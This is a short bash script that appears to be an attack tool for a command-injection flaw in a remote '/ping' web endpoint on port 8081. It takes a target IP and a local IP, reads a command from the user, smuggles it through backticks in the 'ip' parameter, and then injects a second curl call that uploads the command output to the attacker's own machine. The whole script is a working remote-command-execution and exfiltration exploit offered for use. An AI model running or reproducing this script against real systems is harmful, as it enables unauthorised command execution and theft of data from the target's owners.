#!/bin/bash

# Colors
COLOR_OFF='\033[0m'       # Text Reset
BLACK='\033[0;30m'        # Black
RED='\033[0;31m'          # Red
GREEN='\033[0;32m'        # Green
YELLOW='\033[0;33m'       # Yellow
BLUE='\033[0;34m'         # Blue
PURPLE='\033[0;35m'       # Purple
CYAN='\033[0;36m'         # Cyan
WHITE='\033[0;37m'        # White

# Bold Colors
BBLACK='\033[1;30m'       # Black
BRED='\033[1;31m'         # Red
BGREEN='\033[1;32m'       # Green
BYELLOW='\033[1;33m'      # Yellow
BBLUE='\033[1;34m'        # Blue
BPURPLE='\033[1;35m'      # Purple
BCYAN='\033[1;36m'        # Cyan
BWHITE='\033[1;37m'       # White

# Params
IP=$1
LOCAL_IP=$2


echo -e "Hello !!!\nThe remote IP is ${BGREEN}${1}${COLOR_OFF}\nThe local IP is ${BGREEN}${2}${COLOR_OFF}"
echo -e "${BRED}[!]Don't forget to enable port 80 at your local IP[!]${COLOR_OFF}"

echo -e "\nPlease, insert a command:"
read input

curl -G --data-urlencode "ip=${1}\`$input &>/tmp/output\`" "http://${1}:8081/ping" &>/dev/null
curl -G --data-urlencode "ip=${1}\`curl --no-keepalive ${2} -T /tmp/output\`" "http://${1}:8081/ping" &>/dev/null &

echo -e "\n${BGREEN}Command executed !!${COLOR_OFF}"

